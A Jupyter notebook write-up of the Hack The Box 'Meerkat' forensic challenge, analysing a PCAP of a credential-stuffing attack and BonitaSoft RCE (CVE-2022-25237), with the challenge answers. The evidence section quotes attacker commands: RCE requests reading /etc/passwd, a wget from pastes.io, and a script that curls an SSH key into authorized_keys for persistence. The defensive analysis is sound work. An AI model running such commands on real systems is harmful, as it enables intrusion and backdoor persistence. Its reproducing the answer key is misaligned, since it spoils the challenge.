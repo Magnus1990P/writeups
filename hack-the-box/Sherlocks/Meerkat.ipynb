{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Meerkat\n",
    "Easy\n",
    "\n",
    "**Scenario**:  \n",
    "As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren't the most security aware. As our new security provider we'd like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Evidence\n",
    "\n",
    "### Attack discovered\n",
    "1. Password bruteforce attack evident, many login requests attempted untill successfull login occurs\n",
    "    - POST requests directed at `http://forela.co.uk:8080/bonita/loginservice`\n",
    "    - Packet 2158 is the start of the bruteforce\n",
    "    - Packet 2900 is the first authenticated credential  \n",
    "        `username=seb.broom%40forela.co.uk`  \n",
    "        `password=g0vernm3nt`\n",
    "1. Attacker uploads a file to the application\n",
    "    - Packet 2918\n",
    "    - `rce_api_extension.zip` contains JAR file `resourceNameRestAPI-1.0.0-SNAPSHOT.jar`\n",
    "1. Attacker accesses the extension via web UI to verify functionality\n",
    "    - Packet 2925\n",
    "1. Attacker launches attack\n",
    "    - Packet 2931\n",
    "    - GET request to `/bonita/API/extension/rce?p=0&c=1&cmd=whoami`\n",
    "1. Attacker accesses the extension via web UI to verify functionality\n",
    "    - Packet 2925\n",
    "1. Attacker tries to download `/etc/passwd`\n",
    "    - Packet 3586\n",
    "    - `/bonita/API/extension/rce?p=0&c=1&cmd=cat%20/etc/passwd`\n",
    "1. Attacker downloads remote file onto server\n",
    "    - Packet 3652\n",
    "    - `http://forela.co.uk:8080/bonita/API/extension/rce?p=0&c=1&cmd=wget%20https://pastes.io/raw/bx5gcr0et8`\n",
    "    - `https://pastes.io/raw/bx5gcr0et8` - Downloads a bash script  \n",
    "        ```\n",
    "        #!/bin/bash\n",
    "        curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys\n",
    "        sudo service ssh restart\n",
    "        ```  \n",
    "    - `https://pastes.io/raw/hffgra4unv` - in turn downlads a SSH key  \n",
    "        ```\n",
    "        ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN\n",
    "        ```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "with open(\"logins.json\") as login_file:\n",
    "    logins = json.load(login_file)\n",
    "credentials = []\n",
    "for login in logins:\n",
    "    data = login[\"_source\"][\"layers\"][\"urlencoded-form\"]\n",
    "    username = \"\"\n",
    "    password = \"\"\n",
    "    for key,val in data.items():\n",
    "          if val[\"urlencoded-form.key\"] == \"username\":\n",
    "               username = val[\"urlencoded-form.value\"]\n",
    "          if val[\"urlencoded-form.key\"] == \"password\":\n",
    "               password = val[\"urlencoded-form.value\"]\n",
    "    credentials.append(f\"{username} {password}\")\n",
    "    \n",
    "print(credentials)\n",
    "print(list(set(credentials)))\n",
    "print(len(list(set(credentials))))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "with open(\"meerkat-alerts.json\") as alert_file:\n",
    "    alerts = json.load(alert_file)\n",
    "for alert in alerts:\n",
    "    if \"alert\" not in alert:\n",
    "        print(alert.keys())\n",
    "        print(alert[\"server_name\"])\n",
    "    else:\n",
    "        print(alert[\"alert\"].keys())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "## Answers\n",
    "---\n",
    "\n",
    "- Task 1 - We believe our Business Management Platform server has been compromised. Please can you confirm the name of the application running?\n",
    "    - BonitaSoft\n",
    "- Task 2 - We believe the attacker may have used a subset of the brute forcing attack category - what is the name of the attack carried out?\n",
    "    - Credential Stuffing\n",
    "- Task 3 - Does the vulnerability exploited have a CVE assigned - and if so, which one?\n",
    "    - CVE-2022-25237\n",
    "- Task 4 - Which string was appended to the API URL path to bypass the authorization filter by the attacker's exploit?\n",
    "    - i18ntranslation\n",
    "- Task 5 - How many combinations of usernames and passwords were used in the credential stuffing attack?\n",
    "    - 56\n",
    "- Task 6 - Which username and password combination was successful?\n",
    "    - seb.broom@forela.co.uk:g0vernm3nt\n",
    "- Task 7 - If any, which text sharing site did the attacker utilise?\n",
    "    - pastes.io\n",
    "- Task 8 - Please provide the file hash of the script used by the attacker to gain persistent access to our host.\n",
    "    - 0dc54416c346584539aa985e9d69a98e\n",
    "- Task 9 - Please provide the file hash of the public key used by the attacker to gain persistence on our host.\n",
    "    - dbb906628855a433d70025b6692c05e7\n",
    "- Task 10 - Can you confirmed the file modified by the attacker to gain persistence?\n",
    "    - /home/ubuntu/.ssh/authorized_keys\n",
    "- Task 11 - Can you confirm the MITRE technique ID of this type of persistence mechanism?\n",
    "    - T1098.004\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
